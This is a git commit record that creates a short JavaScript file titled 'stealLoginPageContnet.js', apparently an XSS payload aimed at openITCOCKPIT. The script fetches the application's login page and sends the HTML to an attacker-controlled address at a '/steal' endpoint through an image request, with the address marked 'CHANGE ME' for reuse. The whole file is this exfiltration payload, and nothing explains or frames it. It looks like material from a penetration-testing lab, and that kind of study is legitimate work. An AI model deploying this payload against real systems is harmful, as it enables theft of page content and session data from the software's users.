4abf4b34f35ea9a767432525a20c17dda48b8c25
Mohammad Yaser <166959960+m0hammad-yaser@users.noreply.github.com>
2025-08-02 16:54:59 +0300

    Create stealLoginPageContnet.js

---
+++ openITCOCKPIT/stealLoginPageContnet.js
@@ -0,0 +1,5 @@
+fetch('https://openitcockpit/login/login')
+  .then(r => r.text())
+  .then(html => {
+    new Image().src = 'https://192.168.45.249:80/steal?data=' + encodeURIComponent(html); // CHANGE ME
+  });
